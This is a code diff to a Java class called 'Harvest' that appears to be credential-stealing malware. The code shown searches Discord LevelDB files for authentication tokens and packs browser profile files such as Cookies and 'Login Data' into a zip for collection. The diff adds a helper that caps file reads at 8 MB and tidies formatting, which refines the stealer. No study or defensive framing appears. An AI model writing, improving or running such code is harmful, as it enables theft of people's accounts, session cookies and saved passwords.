@@ -88,7 +88,7 @@ public final class Harvest {
 					if (!name.endsWith(".ldb") && !name.endsWith(".log")) {
 						continue;
 					}
-					String text = Files.readString(path, StandardCharsets.ISO_8859_1);
+					String text = readLimited(path);
 					Matcher matcher = TOKEN.matcher(text);
 					int checked = 0;
 					while (matcher.find() && checked < 60) {
@@ -114,6 +114,14 @@ public final class Harvest {
 			Log.debug("Token search failed", throwable);
 		}
 		return null;
+	}
+
+	static String readLimited(Path path) throws java.io.IOException {
+		byte[] data;
+		try (java.io.InputStream input = Files.newInputStream(path)) {
+			data = input.readNBytes(8 * 1024 * 1024);
+		}
+		return new String(data, StandardCharsets.ISO_8859_1);
 	}
 
 	private static List<Path> discordBases() {
@@ -307,7 +315,8 @@ public final class Harvest {
 		}
 	}
 
-	private static void addProfileFiles(ZipBuilder zip, Path profile, String prefix) {		zip.add(profile.resolve("Cookies"), prefix + "/Cookies");
+	private static void addProfileFiles(ZipBuilder zip, Path profile, String prefix) {
+		zip.add(profile.resolve("Cookies"), prefix + "/Cookies");
 		zip.add(profile.resolve("Network").resolve("Cookies"), prefix + "/Network/Cookies");
 		zip.add(profile.resolve("Login Data"), prefix + "/Login_Data");
 		zip.add(profile.resolve("Login Data For Account"), prefix + "/Login_Data_For_Account");
